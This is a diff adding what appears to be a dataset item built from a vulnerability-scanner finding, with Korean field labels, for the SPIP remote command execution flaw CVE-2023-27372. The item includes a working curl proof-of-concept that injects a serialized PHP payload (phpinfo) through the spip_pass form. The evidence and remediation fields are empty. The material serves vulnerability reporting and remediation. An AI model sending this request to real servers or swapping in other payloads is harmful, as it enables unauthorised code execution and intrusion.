@@ -1,0 +1,11 @@
+입력:
+제목: SPIP - Remote Command Execution
+심각도: CRITICAL
+카테고리: CVE
+엔드포인트: http://10.67.128.251//spip/spip.php
+CVE: cve-2023-27372
+설명: SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
+영향: Successful exploitation of this vulnerability could allow an attacker to execute arbitrary commands on the target system.
+증거: 
+재현: curl -X 'POST' -d 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx&oubli=s:19:"<?php phpinfo(); ?>";' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: 10.67.128.251' -H 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4' 'http://10.67.128.251//spip/spip.php?page=spip_pass'
+대응/조치 힌트:
